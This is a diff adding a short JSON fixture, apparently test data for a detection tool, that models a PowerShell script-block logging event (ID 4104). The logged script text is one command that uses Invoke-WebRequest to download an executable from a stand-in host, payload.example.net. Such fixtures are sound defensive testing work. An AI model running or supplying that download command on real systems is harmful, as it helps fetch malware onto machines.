@@ -1,0 +1,21 @@
+{
+  "sensor": "powershell",
+  "channel": "Microsoft-Windows-PowerShell/Operational",
+  "event_id": 4104,
+  "record_id": 55,
+  "ts": "2026-11-09T01:00:06.0000000Z",
+  "script_block": {
+    "id": "9e3f6c1a-0000-4000-8000-000000000001",
+    "text": "Invoke-WebRequest https://payload.example.net/p.exe",
+    "parts_total": 1,
+    "parts_received": 1,
+    "complete": true,
+    "truncated": false
+  },
+  "process": {
+    "pid": 5200
+  },
+  "user": {
+    "sid": "S-1-5-21-1-1001"
+  }
+}
